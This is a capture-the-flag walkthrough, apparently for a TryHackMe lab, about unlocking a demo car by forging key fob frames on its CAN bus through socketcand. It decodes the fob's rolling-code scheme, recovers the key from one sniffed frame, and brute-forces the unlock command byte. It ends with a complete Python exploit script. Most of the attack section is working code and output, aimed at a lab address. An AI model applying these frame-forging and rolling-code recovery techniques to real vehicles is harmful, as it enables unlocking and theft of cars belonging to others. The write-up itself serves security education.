# Phantom Fob: Step-by-Step Walkthrough

**Author:** mr-destroyer/zim
**Target:** `10.49.141.64`

A demo vehicle's CAN bus, a key fob with Lock and Horn but no Unlock, and a
manufacturer claiming the unlock command "can't be copied". Goal: craft the
unlock message ourselves and retrieve the flag.

---

## Step 0: Reconnaissance

```bash
nmap -Pn -p- --min-rate 4000 -T4 10.49.141.64
```

```
22/tcp    open  ssh
8080/tcp  open  http-proxy
29536/tcp open  unknown
```

`8080` is an "Instrument Cluster" dashboard. `29536` is the interesting one: that is socketcand's default port, i.e. **the CAN bus itself**, which matches
the challenge premise of being "plugged into the bus".

Browsing `http://10.49.141.64:8080/` shows a live dashboard with a key fob
offering exactly four buttons: Lock, Horn, Immobiliser Arm, Immobiliser Disarm.
No Unlock.

---

## Step 1: Get on the bus

socketcand speaks a small line protocol over TCP. Connect on `29536`, then:

```
server → < hi >
client → < open vcan0 >
server → < ok >
client → < rawmode >
server → < ok >
```

Frames then stream as `< frame <ID> <sec.usec> <DATA> >`.

```python
import socket, re, time

FRAME_RE = re.compile(r"< frame ([0-9A-Fa-f]+) ([0-9]+\.[0-9]+) ([0-9A-Fa-f]*) >")

def bus_conn(host="10.49.141.64", port=29536):
    s = socket.create_connection((host, port), timeout=10)
    s.settimeout(0.05)
    s.sendall(b"< open vcan0 >\n"); time.sleep(0.8)
    s.sendall(b"< rawmode >\n");    time.sleep(0.4)
    return s
```

**Gotcha:** no colons: `< open vcan0 >`, not `< open: vcan0 >`.

Injecting uses lowercase space-separated hex:

```
< send 421 8 1e e5 2d 99 b6 59 3f 76 >
```

Open a second connection if you want to watch and inject at the same time.

---

## Step 2: Learn the bus

Dump a few seconds of traffic and count frames per ID:

| ID | Rate | Role |
|----|------|------|
| `0x39E` | ~5/s | vehicle state (doors / immobiliser / horn) |
| `0x421` | per button press | the key fob |
| `0x565` | ~1.1/s | rolling value broadcast |
| others | | noise / other ECUs |

`0x39E` decodes cleanly:

```
01 01 00 A5 00 00 00 00
│  │  │  └── constant 0xA5
│  │  └───── horn
│  └──────── immobiliser (01 = armed)
└─────────── doors (00 = unlocked, 01 = locked)
```

**Dead end worth avoiding:** flooding `39E 000000A500000000` makes the web
dashboard *display* UNLOCKED, because the dashboard is just a bus listener. It
does **not** unlock the real car and releases no flag. `39E` is status, not
command.

---

## Step 3: Decode the fob frame (`0x421`)

Press each button and capture the resulting `0x421` frame:

```
1E E5 2D 99 B6 59 3F 76    ← Horn
```

Mapping the commands by pressing each button:

| Button | byte 6 |
|--------|--------|
| Lock | `0xCD` |
| Horn | `0x3F` |
| Immobiliser Arm | `0xBF` |
| Immobiliser Disarm | `0x53` |

Structure emerges:

```
 b0  b1  b2  b3  b4  b5  b6  b7
 1e  e5  2d  99  b6  59  3f  76
          └───┘       │   │   └── constant 0x76
          constant    │   └────── command
                      └────────── counter (+1 per press, 8-bit)
```

So `b2b3 = 2D99` and `b7 = 76` are constants, `b5` is a rolling counter and
`b6` is the command. That leaves `b0`, `b1`, `b4` unknown.

**First attempt (fails):** take a valid frame, keep everything, flip `b6` to a
guessed unlock value, send it. The car rejects it. Sweeping all 256 values of
`b6` also fails. So something else is validated.

---

## Step 4: Notice the pattern in the unknown bytes

Collect a few hundred presses and look at the three unknown bytes:

```
ctr  b0  b1  b4
 5A  D6  96  0E
 5B  D6  97  0E
 5C  A2  36  DC
 5D  A2  37  DC
 5E  EE  B3  17
 5F  EE  B2  17
 60  EE  8D  17
```

Two observations:

1. `b0` and `b4` change **together**: when one moves, so does the other.
2. `b1` drifts inside that group, tracking `b5` but not exactly.

Testing `b1` against the counter within a group:

```
b5=5E → b1=B3   B3 ^ 5E = ED
b5=5F → b1=B2   B2 ^ 5F = ED
b5=60 → b1=8D   8D ^ 60 = ED    ← same constant
```

So **`b1 = counter XOR K`**, with `K` fixed inside a group.

---

## Step 5: Find where the code comes from

Look for what makes the group boundaries. ID `0x565` broadcasts:

```
1734AB0000000000
34DAAC0000000000
C6C5AD0000000000
     └── byte2 increments by 1 per frame
```

Group the captured presses by the `0x565` byte2 value seen at press time and
check whether `(b0, b4)` is constant inside each group:

- 150 groups, **0 impure** → `(b0, b4)` is a pure function of `565.b2`
- and it is **independent of the command** (grouping by `(b2, cmd)` is also pure)

Careful: across different capture sessions the *same* `b2` yields *different*
codes. So the code really tracks the **full `0x565` counter**, and is only valid
**while that byte2 value holds** (~0.9 s).

**Dead end worth avoiding:** because the code depends on a live broadcast rather
than the frame contents, `(b0, b4)` is *not* a deterministic function of
`(counter, command)`: the same counter shows different codes in different
windows. So there is no static lookup table to build, and no simple
sum/xor/CRC checksum to crack (all were tried and ruled out).

---

## Step 6: Recover the key

Compare presses of **different commands** inside one `b2` window:

```
b2=AD   cmd 3F → K=86    86 ^ 3F = B9
        cmd CD → K=74    74 ^ CD = B9   ✓

b2=B0   cmd 53 → K=5A    5A ^ 53 = 09
        cmd BF → K=B6    B6 ^ BF = 09   ✓
        cmd CD → K=C4    C4 ^ CD = 09   ✓
```

So `K = key(b2) XOR command`, meaning:

```
b1 = counter XOR key XOR command
```

Which means the key falls out of **one** captured frame:

```
key = b1 XOR counter XOR command
```

You now have both secrets: `code = (b0, b4)` and `key`.

---

## Step 7: Forge the frame

Mint a frame for any `(counter, command)`:

```
b1' = counter' XOR key XOR command'

frame = [b0] [b1'] [2D] [99] [b4] [counter'] [command'] [76]
```

Two failure modes to avoid:

1. **`b5` and `b1` are linked.** Bumping the counter without recomputing `b1`
   invalidates the frame: this is why naive command-flipping failed.
2. **The code expires with the `565` window.** Do the capture, the derivation and
   the send inside the *same* window (~0.9 s). Sleeping between capture and send
   is already too late.

Sanity-check with a command whose effect you can see: forge an
**Immobiliser Disarm** (`0x53`) and confirm the dashboard's immobiliser flips to
disarmed. That proves forgery works before going after unlock.

---

## Step 8: Sweep for the unlock command

The unlock byte is unknown, so sweep all 256 values of `b6`, incrementing the
counter per frame to stay valid, all inside one `565` window:

```python
for i in range(256):
    c = (ctr + 1 + i) & 0xFF
    b1n = c ^ key ^ i
    send("421", "%02X%02X2D99%02X%02X%02X76" % (b0, b1n, b4, c, i))
```

The car accepts the forged frames and eventually executes the genuine unlock.

---

## Step 9: Flag

The flag is released on the bus the moment the car unlocks:

```
THM{C4r_H4cking_is_kind4_c00l}
```

---

## Full exploit

```python
#!/usr/bin/env python3
import socket, re, time, json, urllib.request, threading

HOST, CAN_PORT, HTTP = "10.49.141.64", 29536, 8080
FRAME_RE = re.compile(r"< frame ([0-9A-Fa-f]+) ([0-9]+\.[0-9]+) ([0-9A-Fa-f]*) >")
frames, sse = [], []

def bus_conn():
    s = socket.create_connection((HOST, CAN_PORT), timeout=10)
    s.settimeout(0.05)
    s.sendall(b"< open vcan0 >\n"); time.sleep(0.8)
    s.sendall(b"< rawmode >\n");    time.sleep(0.4)
    return s

def watch(s):
    buf = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            continue
        if not d:
            return
        buf += d
        while b">" in buf:
            unit, buf = buf.split(b">", 1)
            m = FRAME_RE.search((unit + b">").decode("latin1"))
            if m:
                frames.append((time.time(), m.group(1).upper(), m.group(3).upper()))

def sse_reader():
    r = urllib.request.urlopen("http://%s:%d/events" % (HOST, HTTP), timeout=600)
    buf = b""
    while True:
        d = r.read(1)
        if not d:
            return
        buf += d
        if d == b"\n":
            line = buf.decode(errors="replace").strip(); buf = b""
            if line.startswith("data: "):
                j = json.loads(line[6:])
                sse.append((j.get("locked"), j.get("immob"), j.get("flag")))

def send_bus(s, cand_id, data_hex):
    b = [data_hex[i:i+2].lower() for i in range(0, len(data_hex), 2)]
    s.sendall(("< send %s %d %s >\n" % (cand_id, len(b), " ".join(b))).encode())

def press(btn):
    req = urllib.request.Request(
        "http://%s:%d/press" % (HOST, HTTP),
        data=json.dumps({"button": btn}).encode(),
        headers={"Content-Type": "application/json"}, method="POST")
    urllib.request.urlopen(req, timeout=5).read()

def grab_fob(btn="LOCK"):
    """Press a button and return the resulting 0x421 frame."""
    n0 = len(frames)
    t0 = time.time()
    press(btn)
    while time.time() - t0 < 2.0:
        c = [d for t, i, d in frames[n0:] if i == "421"]
        if c:
            return c[-1]
    return None

def main():
    obs, inj = bus_conn(), bus_conn()
    threading.Thread(target=watch, args=(obs,), daemon=True).start()
    threading.Thread(target=sse_reader, daemon=True).start()
    time.sleep(3)

    press("IMMOB_ARM"); time.sleep(1.0)
    press("LOCK");      time.sleep(1.2)

    for _ in range(3):
        fd = grab_fob("LOCK")
        b0  = int(fd[0:2], 16)
        b1  = int(fd[2:4], 16)
        b4  = int(fd[8:10], 16)
        ctr = int(fd[10:12], 16)
        cmd = int(fd[12:14], 16)

        # the two secrets, recovered from one captured frame
        key = b1 ^ ctr ^ cmd

        # sweep every command byte inside the same 0x565 window
        for i in range(256):
            c   = (ctr + 1 + i) & 0xFF
            b1n = c ^ key ^ i
            send_bus(inj, "421", "%02X%02X2D99%02X%02X%02X76" % (b0, b1n, b4, c, i))

        time.sleep(1.2)
        locked, immob, flag = sse[-1]

        if flag:
            print("[+] FLAG:", flag)
            return
        press("LOCK"); time.sleep(0.8)

if __name__ == "__main__":
    main()
```

---

## Why it works

The manufacturer's "can't be copied" claim rests on a rolling code, and the
rolling value is broadcast in the clear on `0x565`. Worse, the fob leaks the
rest of the scheme with every press: `b1` is `counter XOR key XOR command`, so
`key = b1 XOR counter XOR command` falls straight out of a single sniffed frame.

Nothing here needs the key to be *cracked*. The fob simply hands you both halves
of its authentication, and the only real trick is being fast enough to use them
before the `0x565` counter moves on.
